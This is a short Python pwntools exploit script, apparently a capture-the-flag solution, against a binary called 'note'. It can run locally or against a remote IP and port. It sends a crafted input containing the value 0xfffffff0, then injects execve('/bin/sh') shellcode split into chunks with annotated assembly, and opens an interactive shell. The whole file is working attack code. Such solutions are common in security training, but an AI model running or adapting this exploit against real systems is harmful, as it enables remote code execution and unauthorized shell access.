from pwn import *

#context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./note')
#libc = ELF('./libc-2.31.so')

debug = 1

if debug:
    io = process('./note')
else:
    io = remote('39.102.55.191',9998)

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget= [,,]

io.sendlineafter(b"#          404 not found                 ",str(1))
io.sendline(b'0')
p()
payload = b'\x31\x32' + b'\x00' *2 + b'\x00' *6 + p32(0xfffffff0)+ b'\x0a'
io.send(payload)

# shellcode
shellcode = [b'H\xbf/bin/sh\x00W\xc3',b'\xBE\x3B\x00\x00\x00\x56\xC3',b'_XH1\xf6H1\xd2\x0f\x05']
'''
mov    rdi, 0x68732f6e69622f
push rdi 
ret 

mov rsi, 0x3b
push rsi
ret         \xBE\x3B\x00\x00\x00\x56\xC3

pop rdi
pop rax
xor rsi, rsi
xor rdx, rdx
syscall     _XH1\xf6H1\xd2\x0f\x05

'''
#shellcode = asm('''
#mov    rdi, 0x68732f6e69622f
#push rdi 
#ret 
#        ''')
#print(shellcode)
########################

#p()
io.send(shellcode[0])
io.send(b'2\n')

io.interactive()
